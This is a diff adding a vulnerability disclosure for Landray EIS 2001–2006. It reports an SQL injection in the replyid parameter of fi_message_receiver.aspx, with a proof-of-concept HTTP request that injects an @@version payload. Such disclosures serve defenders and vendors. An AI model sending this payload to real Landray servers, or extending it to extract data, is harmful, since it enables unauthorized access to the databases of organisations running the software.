@@ -1,0 +1,41 @@
+
+## PRODUCT
+
+landray EIS
+
+## Vendor of Product
+
+https://www.landray.com.cn/
+
+## VERSION
+
+EIS 2001-2006
+
+## Vulnerability Type
+
+SQL injection
+
+## Description
+Vulnerabilities classified as fatal have been found in Landray EIS 2001 through 2006. This vulnerability affects the component API interface file/Message/fi_message_receiver.aspx? replyid parameter of replyid. Manipulation on the replyid parameter causes SQL injection
+
+
+
+## POC：
+```
+GET /Message/fi_message_receiver.aspx?replyid=1%20and%201=@@version--+ HTTP/1.1
+Host: 127.0.0.1
+Accept-Language: zh-CN
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: Lang=zh-cn; ASP.NET_SessionId=hrqq2u554a1zlurqqbuegun0
+Connection: keep-alive
+```
+
+
+official website
+https://www.landray.com.cn/
+
+
+
